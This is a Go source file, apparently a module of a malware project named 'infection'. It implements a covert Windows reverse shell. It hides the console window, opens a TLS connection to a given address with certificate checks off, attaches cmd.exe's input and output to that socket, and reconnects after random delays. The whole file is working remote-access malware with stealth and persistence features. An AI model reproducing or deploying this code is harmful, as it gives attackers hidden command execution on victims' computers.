package reverse

import (
	"crypto/tls"
	"io"
	"math/rand"
	"os/exec"
	"time"
	//"syscall"
	"infection/tunnel/w32"
	//"log"
)

var cmd *exec.Cmd
var soc *tls.Conn

func CreateRevShell(prot string, addr string) {
	HideWindow()
	start(prot, addr)
}

func DestroyShell() {
	cmd.Process.Kill()
	soc.Close()
}

func HideWindow() {
	console := w32.GetConsoleWindow()
	if console == 0 {
		return
	}
	_, consoleProcID := w32.GetWindowThreadProcessId(console)
	if w32.GetCurrentProcessId() == consoleProcID {
		w32.ShowWindowAsync(console, w32.SW_HIDE)
	}
}

func start(prot string, addr string) {
	rand.Seed(time.Now().UTC().UnixNano())
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}
	var err error
	soc, err = tls.Dial(prot, addr, conf)
	if err != nil {
		RandomSleep()
		CreateRevShell(prot, addr)
	}
	cmd = exec.Command("cmd")
	cmd.Stdin = soc
	cmd.Stdout = soc
	cmd.Stderr = soc
	err = cmd.Run()
	if err != nil {
		RandomSleep()
		CreateRevShell(prot, addr)
	}
	for {
		tmp := make([]byte, 256)
		if _, err := soc.Read(tmp); err == io.EOF {
			soc.Close()
			cmd.Process.Kill()
			CreateRevShell(prot, addr)
		}
	}
}

func RandomSleep() {
	r := rand.Int() % 35
	time.Sleep(time.Duration(r) * time.Second)
}
